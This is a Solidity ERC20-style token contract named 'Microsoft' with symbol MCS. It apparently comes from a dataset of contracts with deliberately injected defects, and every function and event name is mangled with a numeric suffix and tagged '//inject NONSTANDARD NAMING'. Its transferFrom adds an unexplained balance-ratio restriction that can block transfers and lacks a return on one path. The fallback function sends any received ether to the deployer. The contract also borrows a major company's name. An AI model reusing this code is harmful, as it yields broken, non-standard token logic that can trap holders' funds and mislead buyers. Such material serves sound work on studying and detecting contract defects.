                                                                 

pragma solidity 0.5.17;

contract ERC20 {
    function TOTALSUPPLY101() public view returns (uint supply);	//inject NONSTANDARD NAMING
    function BALANCEOF33(address who) public view returns (uint value);	//inject NONSTANDARD NAMING
    function ALLOWANCE622(address owner, address spender) public view returns (uint remaining);	//inject NONSTANDARD NAMING
    function TRANSFERFROM567(address from, address to, uint value) public returns (bool ok);	//inject NONSTANDARD NAMING
    function APPROVE750(address spender, uint value) public returns (bool ok);	//inject NONSTANDARD NAMING
    function TRANSFER978(address to, uint value) public returns (bool ok);	//inject NONSTANDARD NAMING
    event TRANSFER20(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL262(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Microsoft is ERC20{
    uint8 public constant decimals984 = 18;	//inject NONSTANDARD NAMING
    uint256 initialSupply = 20000000*10**uint256(decimals984);
    string public constant name553 = "Microsoft";	//inject NONSTANDARD NAMING
    string public constant symbol491 = "MCS";	//inject NONSTANDARD NAMING

    address payable teamAddress;


    function TOTALSUPPLY101() public view returns (uint256) {	//inject NONSTANDARD NAMING
        return initialSupply;
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    
    function BALANCEOF33(address owner) public view returns (uint256 balance) {	//inject NONSTANDARD NAMING
        return balances[owner];
    }

    function ALLOWANCE622(address owner, address spender) public view returns (uint remaining) {	//inject NONSTANDARD NAMING
        return allowed[owner][spender];
    }

    function TRANSFER978(address to, uint256 value) public returns (bool success) {	//inject NONSTANDARD NAMING
        if (balances[msg.sender] >= value && value > 0) {
            balances[msg.sender] -= value;
            balances[to] += value;
            emit TRANSFER20(msg.sender, to, value);
            return true;
        } else {
            return false;
        }
    }
    
    function TRANSFERFROM567(address from, address to, uint256 value) public returns(bool success) {	//inject NONSTANDARD NAMING
        if ((balances[to] * 10) <= balances[from]) {
    
            if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {
    
                balances[to] += value;
                balances[from] -= value;
                allowed[from][msg.sender] -= value;
                emit TRANSFER20(from, to, value);
                return true;
            } else {
                return false;
            }
        }
    
    }
    

    


    function APPROVE750(address spender, uint256 value) public returns (bool success) {	//inject NONSTANDARD NAMING
        allowed[msg.sender][spender] = value;
        emit APPROVAL262(msg.sender, spender, value);
        return true;
    }
    
     function () external payable {
        teamAddress.transfer(msg.value);
    }

    constructor () public payable {
        teamAddress = msg.sender;
        balances[teamAddress] = initialSupply;
    }

   
}